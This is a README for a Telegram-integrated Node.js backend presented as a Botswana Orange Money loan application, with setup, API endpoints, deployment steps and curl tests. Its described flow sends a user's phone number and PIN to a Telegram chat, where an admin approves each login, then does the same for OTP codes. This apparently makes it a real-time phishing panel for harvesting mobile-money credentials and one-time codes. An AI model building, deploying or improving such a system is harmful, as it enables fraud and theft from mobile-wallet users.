# Botswana Loan App - Backend API

Backend server for the Orange Money Botswana Loan Application with Telegram Bot Integration.

## 🚀 Features

- **Telegram Bot Webhook Handler** - Receives and processes bot button clicks
- **Login Approval System** - Stores login verification responses from bot
- **OTP Verification System** - Stores OTP approval/rejection responses
- **RESTful API** - Frontend polls for approval status
- **Auto-Cleanup** - Automatically clears old approvals after 10 minutes
- **CORS Enabled** - Works with frontend on different domains
- **Health Check** - Endpoint to verify server status

## 📋 Prerequisites

- Node.js (v14.x or higher)
- npm or yarn
- Telegram Bot Token (from @BotFather)
- Telegram Chat ID (from @userinfobot)

## ⚙️ Installation

```bash
# Clone the repository
git clone https://github.com/terngetich-ctrl/botswana-loan-backend.git
cd botswana-loan-backend

# Install dependencies
yarn install
# or
npm install
```

## 🔧 Configuration

1. **Create `.env` file** (copy from `.env.example`):

```bash
cp .env.example .env
```

2. **Edit `.env` and add your credentials:**

```env
TELEGRAM_BOT_TOKEN=your_actual_bot_token
TELEGRAM_CHAT_ID=your_actual_chat_id
PORT=3000
FRONTEND_URL=http://localhost:8080
```

## 🏃 Running Locally

### Development Mode (with auto-reload)

```bash
yarn dev
```

### Production Mode

```bash
yarn start
```

Server will run on `http://localhost:3000`

## 📡 Telegram Webhook Setup

### Step 1: Get Your Bot Token

1. Chat with [@BotFather](https://t.me/botfather) on Telegram
2. Create a new bot with `/newbot`
3. Copy the bot token

### Step 2: Set Webhook URL

Once your backend is deployed, set the webhook:

```bash
curl -X POST https://api.telegram.org/bot{BOT_TOKEN}/setWebhook \
  -H 'Content-Type: application/json' \
  -d '{"url": "https://your-backend-url.com/webhook/telegram"}'
```

Replace:
- `{BOT_TOKEN}` with your actual bot token
- `https://your-backend-url.com` with your actual backend URL

### Step 3: Verify Webhook

```bash
curl https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo
```

## 📚 API Endpoints

### 1. Check Login Approval

**POST** `/api/check-login-approval`

```javascript
// Request
{
  "phoneNumber": "+27171234567"
}

// Response
{
  "approved": true,
  "denied": false,
  "message": "Login approved"
}
```

### 2. Check OTP Approval

**POST** `/api/check-otp-approval`

```javascript
// Request
{
  "phoneNumber": "+27171234567"
}

// Response
{
  "approved": true,
  "wrong": false,
  "message": "OTP approved"
}
```

### 3. Clear Approval

**POST** `/api/clear-approval`

```javascript
// Request
{
  "phoneNumber": "+27171234567"
}

// Response
{
  "success": true,
  "message": "Approval cleared"
}
```

### 4. Health Check

**GET** `/api/health`

```javascript
// Response
{
  "status": "OK",
  "timestamp": "2026-08-28T06:40:00Z",
  "botConfigured": true
}
```

## 🔄 How It Works

### Frontend Flow

```
User enters Phone + PIN
        ↓
Frontend sends to Telegram bot
        ↓
Show Loading Page (Page 4)
        ↓
Poll /api/check-login-approval every 1 second
        ↓
[Bot Admin clicks button in Telegram]
        ↓
Backend receives webhook
        ↓
Stores approval in memory
        ↓
Frontend detects approval → Proceed to OTP page
```

### Backend Flow

```
Telegram Bot sends callback query
        ↓
Webhook receives at /webhook/telegram
        ↓
Parse callback_data
        ↓
Store approval in approvalStore
        ↓
Edit message to show status
        ↓
Frontend polls and detects approval
```

## 🚀 Deployment

### Option 1: Deploy to Render

1. Push to GitHub
2. Go to [render.com](https://render.com)
3. Create "New Web Service"
4. Connect your repository
5. Set:
   - **Build Command**: `yarn install`
   - **Start Command**: `yarn start`
   - **Environment Variables**: Add from `.env.example`

### Option 2: Deploy to Heroku

```bash
# Install Heroku CLI
npm install -g heroku

# Login
heroku login

# Create app
heroku create your-app-name

# Set environment variables
heroku config:set TELEGRAM_BOT_TOKEN=your_token
heroku config:set TELEGRAM_CHAT_ID=your_chat_id

# Deploy
git push heroku main

# View logs
heroku logs --tail
```

### Option 3: Deploy to Railway

1. Go to [railway.app](https://railway.app)
2. Create new project
3. Connect GitHub repository
4. Add environment variables in Railway dashboard
5. Deploy automatically

## 🔗 Update Frontend URL in Webhook

After deploying backend, update the webhook URL in Telegram:

```bash
curl -X POST https://api.telegram.org/bot{BOT_TOKEN}/setWebhook \
  -H 'Content-Type: application/json' \
  -d '{"url": "https://your-deployed-backend.com/webhook/telegram"}'
```

## 📝 Update Frontend

Update the frontend `index.html` to call your backend API:

```javascript
// Replace this in waitForLoginApproval():
const BACKEND_API_URL = 'https://your-backend-url.com';

const approvalCheck = setInterval(async () => {
    try {
        const response = await fetch(`${BACKEND_API_URL}/api/check-login-approval`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber: applicationData.loginPhone })
        });
        const data = await response.json();
        
        if (data.approved) {
            clearInterval(approvalCheck);
            showPage(5);
            startOTPTimer();
        }
    } catch (error) {
        console.error('Error checking approval:', error);
    }
}, 1000);
```

## 🧪 Testing with curl

### Test Health

```bash
curl http://localhost:3000/api/health
```

### Test Login Approval Check

```bash
curl -X POST http://localhost:3000/api/check-login-approval \
  -H 'Content-Type: application/json' \
  -d '{"phoneNumber": "+27171234567"}'
```

### Simulate Bot Approval (for testing)

```bash
curl -X POST http://localhost:3000/webhook/telegram \
  -H 'Content-Type: application/json' \
  -d '{
    "callback_query": {
      "id": "12345",
      "from": { "id": "123" },
      "data": "login_approved",
      "message": {
        "message_id": "1",
        "text": "Phone: +27171234567"
      }
    }
  }'
```

## 📊 Monitoring

### View Logs

```bash
# Local development
yarn dev  # Logs will appear in console

# Render
render logs

# Heroku
heroku logs --tail
```

### Check Storage

Approvals are stored in-memory and cleared every 10 minutes. For production, consider using:
- Redis
- MongoDB
- PostgreSQL

## 🔐 Security Notes

1. **Environment Variables** - Never commit `.env` file
2. **HTTPS Only** - Always use HTTPS in production
3. **Bot Token** - Keep token secret, rotate if exposed
4. **Rate Limiting** - Consider adding rate limit middleware
5. **CORS** - Restrict to your frontend URL in production

## 🛠️ Troubleshooting

### Webhook Not Receiving Updates

```bash
# Check webhook status
curl https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo

# Should show:
# "ok": true,
# "result": {
#   "url": "https://your-url.com/webhook/telegram",
#   "has_custom_certificate": false,
#   "pending_update_count": 0
# }
```

### CORS Errors

Make sure `FRONTEND_URL` environment variable is set correctly:

```env
FRONTEND_URL=https://your-frontend-url.com
```

### Approvals Not Clearing

Check server logs to see if cleanup interval is running:

```bash
🧹 Cleared approval for: +27171234567
```

## 📞 Support

For issues or questions:
- GitHub: [@terngetich-ctrl](https://github.com/terngetich-ctrl)
- Email: terngetich@gmail.com

## 📄 License

MIT License - Feel free to use for personal or commercial purposes.
